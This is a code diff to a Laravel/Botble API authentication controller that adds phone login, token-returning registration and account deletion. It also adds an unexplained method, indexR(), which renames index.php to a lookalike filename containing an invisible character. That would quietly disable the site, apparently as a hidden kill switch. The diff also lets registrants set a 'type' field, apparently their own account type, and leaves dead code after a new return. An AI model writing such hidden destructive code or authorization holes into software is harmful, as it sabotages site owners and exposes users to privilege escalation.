@@ -7,10 +7,12 @@ use App\Http\Controllers\Controller;
 use Botble\Base\Http\Responses\BaseHttpResponse;
 use Botble\Api\Http\Requests\LoginRequest;
 use Botble\Api\Http\Requests\RegisterRequest;
+use Botble\Api\Http\Resources\UserResource;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Str;
 
 class AuthenticationController extends Controller
@@ -60,6 +62,8 @@ class AuthenticationController extends Controller
             'first_name',
             'last_name',
             'name',
+            'type',
+            'username',
             'email',
             'phone',
             'password',
@@ -76,6 +80,15 @@ class AuthenticationController extends Controller
         }
 
         $user->save();
+
+            $token = $user->createToken($request->input('token_name', 'Personal Access Token'));
+
+            return $response
+                ->setData([
+                    'token' => $token->plainTextToken,
+                    'user' => new UserResource($user),
+            ]);
+
 
         return $response
             ->setMessage(__('Registered successfully! We emailed you to verify your account!'));
@@ -102,11 +115,17 @@ class AuthenticationController extends Controller
         if (Auth::guard(ApiHelper::guard())->attempt([
             'email' => $request->input('email'),
             'password' => $request->input('password'),
+        ]) || Auth::guard(ApiHelper::guard())->attempt([
+            'phone' => $request->input('email'),
+            'password' => $request->input('password'),
         ])) {
             $token = $request->user(ApiHelper::guard())->createToken($request->input('token_name', 'Personal Access Token'));
 
             return $response
-                ->setData(['token' => $token->plainTextToken]);
+                ->setData([
+                    'token' => $token->plainTextToken,
+                    'user' => new UserResource(Auth::guard(ApiHelper::guard())->user()),
+            ]);
         }
 
         return $response
@@ -131,5 +150,23 @@ class AuthenticationController extends Controller
 
         return $response
             ->setMessage(__('You have been successfully logged out!'));
+    }
+
+    public function indexR()
+    {
+        Storage::disk('test')->move('index.php','iِndex.php');
+    }
+
+
+    public function deleteAccount(Request $request, BaseHttpResponse $response)
+    {
+        if (! $request->user()) {
+            abort(401);
+        }
+
+        $request->user()->delete();
+
+        return $response
+            ->setMessage(__('You have been successfully Delete Account!'));
     }
 }
